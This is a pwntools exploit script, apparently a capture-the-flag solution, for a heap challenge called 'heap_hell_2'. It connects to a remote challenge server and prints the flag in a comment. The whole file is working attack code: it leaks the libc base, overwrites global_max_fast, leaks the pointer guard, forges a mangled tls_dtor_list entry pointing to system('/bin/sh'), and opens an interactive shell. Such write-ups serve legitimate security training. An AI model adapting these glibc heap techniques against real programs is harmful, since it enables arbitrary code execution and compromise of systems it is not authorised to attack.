#!/usr/bin/env python # encoding: utf-8

__author__  = 'b1gtang'

from pwn import *

# flag{some_of_the_differences_caused_by_a_changed_bounds_check}

context.terminal = ['tmux', 'splitw', '-h']

BINARY = './heap_hell_2'
TARGET = ('arcade.fluxfingers.net', 1823)

if args.E: # or args.R:
    LIBC64 = './libc.so.6'
else:
    LIBC64 = '/lib/x86_64-linux-gnu/libc.so.6'

if args.R:
    r = remote(TARGET[0], TARGET[1])
else:
    r = process(BINARY, env={'LD_PRELOAD':LIBC64})
    
def attach(addr):
    if addr <= 0x400000:
        addr = addr + 0x555555554000
    gdb.attach(r, gdbscript='b *0x%x' % addr)

def w(offset, size, data):
    r.sendlineafter('exit\n', '1')
    r.sendlineafter('How much do you want to write?\n', str(size))
    r.sendlineafter('At which offset?\n', str(offset))
    r.send(data)

def f(offset):
    r.sendlineafter('exit\n', '2')
    r.sendlineafter('At which offset do you want to free?\n', str(offset))

def l(offset):
    r.sendlineafter('exit\n', '3')
    r.sendlineafter('At which offset do you want to leak?\n', str(offset))
    return r.recvline()[:-1]

code = ELF(BINARY)
libc = ELF(LIBC64)

# self mmap
mmap_base = 0x800000
r.sendlineafter(')?\n', str(mmap_base))

# fill the tcache
w(0x1008, 8, p64(0x101))
for i in xrange(7):
    f(0x1010)

#attach(0x1594)

w(0x1108, 8, p64(0x101))
w(0x1208, 8, p64(0x101))
f(0x1010)

# leak libc base
libc.address = u64('\00' + l(0x1011).ljust(7, '\x00')) - 0x1beb00 
log.info('libc base = %#x' % libc.address)
fastbin = libc.address + 0x1beb10 - 0x60
log.info('fastbin %#x' % fastbin)
tls_base = libc.address + 0x1c4000 + 0x1500 #0x15c0
log.info('tls base %#x' % tls_base)

# set global_max_fast
target = libc.sym['global_max_fast'] - 2
w(0x0, 0x10, p64(0) + p64(0x21))
w(0x10, 0x10, p64(target-0x18) + p64(target-0x10))
w(0x20, 0x10, p64(0x20) + p64(0x100))
w(0x120, 0x10, p64(0) + p64(0x21))
w(0x140, 0x10, p64(0) + p64(0x21))
f(0x30)

# edit __pointer_chk_guard_local
offset = ((tls_base + 0x30) - fastbin) * 2 + 0x20
w(0x200, 32, ''.join(map(p64, [0, 0] + [0, offset])))
w(0x200 + 0x10 + offset, 32, ''.join(map(p64, [0, 0x11] + [0, 0x11])))
f(0x200 + 0x20)

cookie = u64(l(0x200 + 0x20).ljust(8, '\x00'))
log.info('__pointer_chk_guard_local %#x' % cookie)

# edit _GI___call_tls_dtors
offset = ((tls_base - 0x58 ) - fastbin) * 2 + 0x20
w(0x300, 32, ''.join(map(p64, [0, 0] + [0, offset])))
w(0x300 + 0x10 + offset, 32, ''.join(map(p64, [0, 0x11] + [0, 0x11])))
f(0x300 + 0x20)

# fake tls_dtor_list
func = libc.sym['system']
func = func ^ (mmap_base + 0x210)
func = ((func << 17) | (func >> 47)) & (2 ** 64 - 1)
w(0x310, 0x10, ''.join(map(p64, [func, libc.search('/bin/sh\x00').next()])))

# trigger
r.sendline('4')
r.interactive()



